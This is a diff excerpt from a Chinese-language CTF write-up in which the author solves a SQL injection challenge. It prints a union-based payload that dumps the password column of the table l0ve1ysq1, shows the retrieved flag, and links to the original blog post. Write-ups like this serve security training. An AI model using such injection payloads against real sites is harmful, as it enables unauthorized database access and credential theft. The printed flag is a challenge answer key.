@@ -281,6 +281,7 @@ F12查看隐藏文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/3
 > 无flag
 
 转手数据表l0ve1ysq1<br />步骤和数据表geekuser一样，这里直接爆数据表l0ve1ysq1的flag值<br />`1' union select 1,database(),group_concat(password) from l0ve1ysq1#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912423460-3c81bdee-fb79-40c6-a33f-77d1ef31e897.png#averageHue=%23242322&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=u6276eb70&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=630684&status=done&style=none&taskId=uad685c97-2037-4584-b5df-0a79cd79221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912445735-b36fc7d2-cb85-49a3-a1bf-e1d6f21d01e5.png#averageHue=%23222222&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u20939a6e&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613901&status=done&style=none&taskId=ua38fbf35-d9a8-422a-b92e-f8170c73537&title=&width=1536)<br />**得出flag：**<br />`flag{3c4b1ff9-6685-4dcb-853e-06093c1e4040}`
+
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134185235?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134185235%22%2C%22source%22%3A%22m0_73734159%22%7D
 
 
